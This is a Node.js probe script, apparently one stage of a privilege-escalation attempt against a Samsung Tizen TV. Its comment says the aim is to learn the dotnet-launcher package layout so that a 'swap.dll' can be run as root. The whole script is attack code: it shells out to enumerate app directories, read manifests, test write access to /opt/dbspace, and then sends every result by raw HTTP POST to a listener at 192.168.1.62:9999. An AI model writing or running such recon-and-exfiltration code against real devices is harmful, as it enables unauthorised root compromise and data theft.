"use strict";

/* p12: .NET structure probe — csfs app dir + manifest + dotnet-launcher perms/behavior
   Goal: learn the exact app-dir + manifest layout dotnet-launcher expects, so we can
   package swap.dll and run it as root. */
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.0.0.1';
HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p12', results: {}, log: [] };

function L(s) { R.log.push(String(s).substring(0, 500)); }
function run(cmd, timeout) {
  try {
    return cp.execSync(cmd, { timeout: timeout || 20000, maxBuffer: 16 * 1024 * 1024 }).toString().trim();
  } catch (e) {
    var out = '';
    if (e.stdout) out += e.stdout.toString();
    if (e.stderr) out += (out ? '\n' : '') + e.stderr.toString();
    return '[err] ' + (out || (e && e.message) || 'unknown');
  }
}

function postRaw(path, text) {
  var buf = new Buffer(text, 'utf8');
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: text/plain\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  var sock = null;
  try { sock = net.connect(PORT, HOST); } catch (e) { L('post ctor ' + e); return; }
  sock.on('connect', function () {
    try { sock.write(hdr); } catch (e) {}
    var off = 0;
    var iv = setInterval(function () {
      if (off >= buf.length) {
        clearInterval(iv);
        setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 3000);
        return;
      }
      try { sock.write(buf.slice(off, off + 4096)); } catch (e) {}
      off += 4096;
    }, 100);
    setTimeout(function () { try { sock.destroy(); } catch (e) {} }, 30000);
  });
  sock.on('error', function (e) { L('post error ' + e.message); });
}

R.results.id = run('id 2>&1', 5000);
R.results.usr_apps = run('ls -la /usr/apps/ 2>&1 | grep -iE "csfs|mycontent|store|searchall|dotnet" | head -20', 15000);
R.results.csfs_dir = run('ls -la /usr/apps/com.samsung.tv.csfs/ 2>&1', 15000);
R.results.csfs_dlls = run('ls -la /usr/apps/com.samsung.tv.csfs/*.dll 2>&1', 15000);
R.results.csfs_manifest = run('cat /usr/apps/com.samsung.tv.csfs/manifest 2>&1 | head -60', 15000);
R.results.dotnet_bin = run('ls -la /usr/bin/dotnet-launcher /usr/bin/dotnet-launcher-inhouse 2>&1', 10000);
R.results.dotnet_version = run('/usr/bin/dotnet-launcher --version 2>&1', 15000);
R.results.dotnet_share = run('ls -la /usr/share/dotnet.tizen/ 2>&1 | head -20', 15000);
R.results.dotnet_framework = run('ls /usr/share/dotnet.tizen/framework/ 2>&1 | head -30', 15000);
R.results.dotnet_shared = run('ls /usr/share/dotnet/shared/Microsoft.NETCore.App/ 2>&1 | head', 15000);
R.results.owner_dbspace_dir = run('ls -ld /opt/dbspace 2>&1', 10000);
R.results.owner_write_test = run('touch /opt/dbspace/owner_probe 2>&1 && echo OWNER_WRITE_OK || echo OWNER_WRITE_FAIL', 10000);
R.results.other_dotnet_manifests = run('grep -rl "type=\"dotnet\"" /usr/apps/ 2>/dev/null | head -8', 40000);
R.results.other_dotnet_manifests2 = run('grep -rl "dotnet" /usr/apps/*/manifest 2>/dev/null | head -8', 40000);
R.results.csfs_manifest_full = run('wc -c /usr/apps/com.samsung.tv.csfs/manifest 2>&1; echo ---; cat /usr/apps/com.samsung.tv.csfs/manifest 2>&1', 15000);
R.results.final = 'done ' + new Date().toISOString();
postRaw('/p12info', JSON.stringify(R));
L('p12 done');
